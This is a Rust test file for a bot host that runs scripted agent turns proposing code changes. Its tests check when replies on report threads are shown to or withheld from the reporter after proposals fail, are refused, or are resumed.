/// [`SAID_ON_FAILING`] after it. Answers the run.
async fn replied_after_failing(env: &Env, report: &Report, e: HostError) -> String {
    let code = format!(
        r#"try {{ await clax.change.propose({{title: "t", summary: "s"}}); }} catch (e) {{}}
           return await clax.threads.reply({:?}, {SAID_ON_FAILING:?});"#,
        report.id
    );
    env.api.push(script_turn("tu_1", "Fix", &code));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let w = Arc::new(ProposalFails(FakeWorkspace::default(), e));
    env.drive(&with(env, w), &run, &DriverId::mint()).await;
    run
}

#[tokio::test]
async fn a_proposal_that_failed_keeps_nothing_from_the_reporter() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let refused = HostError::new(CODE_CHANGE_REFUSED, "the working tree has no change");
    let run = replied_after_failing(&env, &report, refused).await;
    reaches_the_reporter(&env, &qid, &report.id, SAID_ON_FAILING);
    assert_eq!(script_value(&env, &run).get("reply_note"), None);
}

#[tokio::test]
async fn a_proposal_that_failed_after_its_push_keeps_the_run_from_the_reporter() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let pushed = HostError::new(
        CODE_SHELL_UNAVAILABLE,
        "the change was pushed, but its pull request could not be opened. Propose it again to \
         finish.",
    );
    let run = replied_after_failing(&env, &report, pushed.retryable()).await;
    kept_from_the_reporter(&env, &qid, &report.id, SAID_ON_FAILING);
    assert_eq!(script_value(&env, &run)["reply_note"], REPLY_KEPT);
}

#[tokio::test]
async fn a_proposal_that_failed_in_a_way_nothing_knows_keeps_the_run_from_the_reporter() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let unknown = HostError::new("no_changes", "the working tree is clean");
    let run = replied_after_failing(&env, &report, unknown).await;
    kept_from_the_reporter(&env, &qid, &report.id, SAID_ON_FAILING);
    assert_eq!(script_value(&env, &run)["reply_note"], REPLY_KEPT);
}

#[tokio::test]
async fn a_begun_proposal_the_report_no_longer_takes_keeps_the_run_from_the_reporter() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(DiesAfterTheEffect::default());
    let code = format!(
        r#"try {{ await clax.change.propose({{title: "t", summary: "s"}}); }} catch (e) {{}}
           return await clax.threads.reply({:?}, {SAID_ON_FAILING:?});"#,
        report.id
    );
    env.api.push(script_turn("tu_1", "Fix", &code));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let deps = with(&env, w.clone());
    let first = DriverId::mint();
    tokio::select! {
        out = env.drive(&deps, &run, &first) => panic!("it ended: {out:?}"),
        () = w.effect.notified() => {}
    }
    let taken = HostError::new("thread_taken", "someone holds this report");
    env.host
        .lock()
        .fail_next
        .insert("check_fix".to_string(), taken);
    env.clock.advance(120);
    env.drive(&deps, &run, &DriverId::mint()).await;
    assert_eq!(env.host.lock().member_notes, [PROPOSAL_STRANDED]);
    kept_from_the_reporter(&env, &qid, &report.id, SAID_ON_FAILING);
}

/// A workspace that does the effect of its first proposal, says so and never
/// answers, then refuses the same proposal when the step comes back to it.
#[derive(Default)]
struct RefusesOnResuming(DiesAfterTheEffect);

#[async_trait::async_trait]
impl Workspace for RefusesOnResuming {
    fn offer(&self, run: &Run, queue: Option<&str>) -> Offer {
        self.0.offer(run, queue)
    }
    async fn exec(
        &self,
        run: &Run,
        queue: Option<&str>,
        command: &str,
        cwd: Option<&str>,
        timeout_secs: u64,
    ) -> Result<Value, HostError> {
        self.0.exec(run, queue, command, cwd, timeout_secs).await
    }
    async fn propose(&self, run: &Run, p: &Proposal) -> Result<Value, HostError> {
        if self.0.died.lock().unwrap().contains(&"propose") {
            return Err(HostError::new(CODE_CHANGE_REFUSED, "the branch moved"));
        }
        self.0.propose(run, p).await
    }
    async fn finish(&self, run: &Run) {
        self.0.finish(run).await;
    }
}

#[tokio::test]
async fn a_refusal_of_a_proposal_begun_before_says_nothing_of_what_left_then() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(RefusesOnResuming::default());
    let code = format!(
        r#"try {{ await clax.change.propose({{title: "t", summary: "s"}}); }} catch (e) {{}}
           return await clax.threads.reply({:?}, {SAID_ON_FAILING:?});"#,
        report.id
    );
    env.api.push(script_turn("tu_1", "Fix", &code));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let deps = with(&env, w.clone());
    let first = DriverId::mint();
    tokio::select! {
        out = env.drive(&deps, &run, &first) => panic!("it ended: {out:?}"),
        () = w.0.effect.notified() => {}
    }
    env.clock.advance(120);
    env.drive(&deps, &run, &DriverId::mint()).await;
    kept_from_the_reporter(&env, &qid, &report.id, SAID_ON_FAILING);
}

#[tokio::test]
async fn a_refusal_on_a_later_proposal_ends_no_hold_an_earlier_one_began() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(FailsThenRefuses::default());
    let code = format!(
        r#"for (const n of [1, 2]) {{
             try {{ await clax.change.propose({{title: "t", summary: "s"}}); }} catch (e) {{}}
           }}
           return await clax.threads.reply({:?}, {SAID_ON_FAILING:?});"#,
        report.id
    );
    env.api.push(script_turn("tu_1", "Fix", &code));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;
    kept_from_the_reporter(&env, &qid, &report.id, SAID_ON_FAILING);
}

/// A workspace whose first proposal fails with its change out, and whose
/// next is refused.
#[derive(Default)]
struct FailsThenRefuses {
    inner: FakeWorkspace,
    proposed: Mutex<u32>,
}

#[async_trait::async_trait]
impl Workspace for FailsThenRefuses {
    fn offer(&self, run: &Run, queue: Option<&str>) -> Offer {
        self.inner.offer(run, queue)
    }
    async fn exec(
        &self,
        run: &Run,
        queue: Option<&str>,
        command: &str,
        cwd: Option<&str>,
        timeout_secs: u64,
    ) -> Result<Value, HostError> {
        self.inner
            .exec(run, queue, command, cwd, timeout_secs)
            .await
    }
    async fn propose(&self, _run: &Run, _p: &Proposal) -> Result<Value, HostError> {
        let mut n = self.proposed.lock().unwrap();
        *n += 1;
        Err(if *n == 1 {
            HostError::new(CODE_SHELL_UNAVAILABLE, "the change was pushed")
        } else {
            HostError::new(CODE_CHANGE_REFUSED, "the working tree has no change")
        })
    }
    async fn finish(&self, run: &Run) {
        self.inner.finish(run).await;
    }
}

/// A workspace whose commands take the store's `threads` table away, as a
/// read that fails after the tick began. [`FakeBotHost`]'s next reply puts it
/// back before writing, through [`clax_bot::host::BeforeReply`].
struct LosesThreads(FakeWorkspace, std::path::PathBuf);

#[async_trait::async_trait]
impl Workspace for LosesThreads {
    fn offer(&self, run: &Run, queue: Option<&str>) -> Offer {
        self.0.offer(run, queue)
    }
    async fn exec(
        &self,
        _run: &Run,
        _queue: Option<&str>,
        _command: &str,
        _cwd: Option<&str>,
        _timeout_secs: u64,
    ) -> Result<Value, HostError> {
        let c = rusqlite::Connection::open(&self.1).unwrap();
        c.execute_batch("ALTER TABLE threads RENAME TO threads_away")
            .unwrap();
        Ok(json!({"exit_code": 0, "output": ""}))
    }
    async fn propose(&self, run: &Run, p: &Proposal) -> Result<Value, HostError> {
        self.0.propose(run, p).await
    }
    async fn finish(&self, run: &Run) {
        self.0.finish(run).await;
    }
}

/// Runs `code` of `run`, whose first command loses the `threads` table until
/// its next reply is planned.
async fn with_threads_lost(env: &Env, run: &str, code: &str) {
    env.api.push(script_turn("tu_1", "Say", code));
    env.api.push(finish_turn("done"));
    let db = env.home_db();
    let back = db.clone();
    env.host.lock().before_reply = Some(clax_bot::host::BeforeReply(Box::new(move || {
        let c = rusqlite::Connection::open(&back).unwrap();
        c.execute_batch("ALTER TABLE threads_away RENAME TO threads")
            .unwrap();
    })));
    let w = Arc::new(LosesThreads(FakeWorkspace::default(), db));
    env.drive(&with(env, w), run, &DriverId::mint()).await;
}

#[tokio::test]
async fn a_read_that_fails_leaves_a_reply_on_a_plain_thread_as_it_was() {
    let env = Env::new().await;
    let run = env.run();
    let code = env.code(
        r#"await clax.shell.exec("ls");
           return await clax.threads.reply("T1", "Here is what I found.");"#,
    );
    with_threads_lost(&env, &run, &code).await;
    assert_eq!(script_value(&env, &run).get("reply_note"), None);
    assert!(
        env.replies()
            .iter()
            .any(|(_, b)| b == "Here is what I found."),
        "{:?}",
        env.replies()
    );
}

#[tokio::test]
async fn a_read_that_fails_keeps_a_reply_on_a_report_from_its_reporter() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let code = format!(
        r#"await clax.shell.exec("ls");
           return await clax.threads.reply({:?}, {SAID_AFTER:?});"#,
        report.id
    );
    with_threads_lost(&env, &run, &code).await;
    kept_from_the_reporter(&env, &qid, &report.id, SAID_AFTER);
}

#[tokio::test]
async fn a_fix_the_report_could_not_take_still_keeps_the_run_from_its_reporter() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    env.host
        .lock()
        .fail_next
        .insert("record_fix".into(), HostError::new("internal", "no"));
    let code = format!(
        r#"await clax.change.propose({{title: "t", summary: "s"}});
           return await clax.threads.reply({:?}, {SAID_AFTER:?});"#,
        report.id
    );
    env.api.push(script_turn("tu_1", "Fix", &code));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let w = Arc::new(FakeWorkspace::default());
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;
    kept_from_the_reporter(&env, &qid, &report.id, SAID_AFTER);
    let saw = serde_json::to_string(&as_reporter(&env, &qid, &report.id)).unwrap();
    assert!(!saw.contains("https://forge.example/pr/1"), "{saw}");
}

#[tokio::test]
async fn a_later_run_is_kept_from_the_reporter_while_a_runs_fix_waits() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(FakeWorkspace::default());
    proposed(&env, &report, &w).await;
    let reply = reply_code(&report.id, SAID_AFTER);
    env.api.push(script_turn("tu_2", "Tell", &reply));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;
    kept_from_the_reporter(&env, &qid, &report.id, SAID_AFTER);
}

#[tokio::test]
async fn a_run_woken_by_a_reply_answers_the_reporter_of_a_fix_they_can_check() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(FakeWorkspace::default());
    proposed(&env, &report, &w).await;
    let reply = reply_code(&report.id, "It covers refunds.");
    env.api.push(script_turn("tu_2", "Answer", &reply));
    env.api.push(finish_turn("done"));
    let run = env.woken_run(WokenBy::Reply, &report.artifact.id, &report.id);
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;
    reaches_the_reporter(&env, &qid, &report.id, "It covers refunds.");
    assert_eq!(script_value(&env, &run).get("reply_note"), None);
}

#[tokio::test]
async fn a_run_woken_by_a_reply_to_a_held_fix_answers_the_queues_people() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = no_preview();
    proposed(&env, &report, &w).await;
    let reply = reply_code(&report.id, SAID_AFTER);
    env.api.push(script_turn("tu_2", "Answer", &reply));
    env.api.push(finish_turn("done"));
    let run = env.woken_run(WokenBy::Reply, &report.artifact.id, &report.id);
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;
    kept_from_the_reporter(&env, &qid, &report.id, SAID_AFTER);
}

#[tokio::test]
async fn a_run_after_a_rejection_talks_to_the_reporter_until_it_proposes() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(FakeWorkspace::default());
    proposed(&env, &report, &w).await;
    env.store
        .reopen_report(
            &AuditCtx::DAEMON,
            &qid,
            &report.id,
            clax_store::queues::Verdict::Reporter(REPORTER),
            "Still broken".into(),
            None,
            None,
            None,
        )
        .unwrap();
    let code = format!(
        r#"await clax.threads.reply({id:?}, "I will look again.");
           await clax.change.propose({{title: "t", summary: "Again."}});
           return await clax.threads.reply({id:?}, {SAID_AFTER:?});"#,
        id = report.id
    );
    env.api.push(script_turn("tu_2", "Fix", &code));
    env.api.push(finish_turn("done"));
    let run = env.woken_run(WokenBy::Reopen, &report.artifact.id, &report.id);
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;
    reaches_the_reporter(&env, &qid, &report.id, "I will look again.");
    kept_from_the_reporter(&env, &qid, &report.id, SAID_AFTER);
}

#[tokio::test]
async fn a_run_on_a_thread_no_queue_holds_replies_as_it_always_did() {
    let env = Env::new().await;
    let w = Arc::new(FakeWorkspace::default());
    env.api.push(env.script_turn(
        "tu_1",
        "Fix",
        r#"await clax.change.propose({title: "t", summary: "s"});
           return await clax.threads.reply("T1", "Proposed it.");"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run();
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;
    let told = script_value(&env, &run);
    assert_eq!(told["value"].get("members_only"), None, "{told}");
    assert_eq!(told.get("reply_note"), None, "{told}");
    let thread = env.store.get_thread(&env.t1).unwrap().unwrap();
    assert!(thread.comments.iter().any(|c| c.body == "Proposed it."));
}

#[tokio::test]
async fn a_plain_run_with_no_workspace_replies_as_it_always_did() {
    let env = Env::new().await;
    env.api.push(env.script_turn(
        "tu_1",
        "Reply",
        r#"return await clax.threads.reply("T1", "Done.");"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run();
    env.drive(&env.deps(), &run, &DriverId::mint()).await;
    let told = script_value(&env, &run);
    assert_eq!(told["value"].get("members_only"), None, "{told}");
    assert_eq!(told.get("reply_note"), None, "{told}");
    let thread = env.store.get_thread(&env.t1).unwrap().unwrap();
    assert!(thread.comments.iter().any(|c| c.body == "Done."));
}
